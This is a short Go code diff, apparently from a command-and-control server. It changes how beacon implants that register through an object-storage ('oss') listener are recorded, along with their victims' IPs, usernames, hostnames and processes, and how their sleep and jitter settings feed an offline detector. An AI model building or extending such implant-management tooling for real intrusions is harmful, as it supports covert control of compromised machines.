@@ -284,7 +284,8 @@ func process_server(c *Client, stopKey, name string, masterKey, salt []byte) {
 				arch = "x64"
 			}
 
-			database.DB().Insert(&database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: strconv.Itoa(connection.ResolveSleepSeconds(osArray, "")), Online: "1", Color: "", Listener: "oss", Os: clientOs})
+			insertBeacon := database.GetListenerBeaconConfigByAddr(stopKey, "oss")
+			database.DB().Insert(&database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: strconv.Itoa(connection.ResolveListenerSleep(osArray, insertBeacon)), Online: "1", Color: "", Listener: "oss", Os: clientOs})
 			database.DB().Insert(&database.Shell{Uid: uid, ShellContent: ""})
 			database.DB().Insert(&database.Notes{Uid: uid, Note: ""})
 
@@ -329,10 +330,10 @@ func process_server(c *Client, stopKey, name string, masterKey, salt []byte) {
 
 		// 注册到统一离线检测器（统一心跳：优先采用客户端上报的 beacon sleep，回退监听器配置）
 		if connection.GlobalOfflineDetector != nil {
-			_, hbInterval := database.GetListenerHeartbeatConfigByAddr(stopKey, "oss")
+			beaconCfg := database.GetListenerBeaconConfigByAddr(stopKey, "oss")
 			ossMeta := strings.Split(string(metainfo[9:]), "\t")
-			sleepSec := connection.ResolveSleepSeconds(ossMeta, hbInterval)
-			connection.GlobalOfflineDetector.Register(uid, "oss", sleepSec)
+			sleepSec := connection.ResolveListenerSleep(ossMeta, beaconCfg)
+			connection.GlobalOfflineDetector.Register(uid, "oss", sleepSec, beaconCfg.JitterPercent)
 			// OSS 为轮询型，无长连接需关闭，仅依赖心跳 Touch 判定
 		}
 
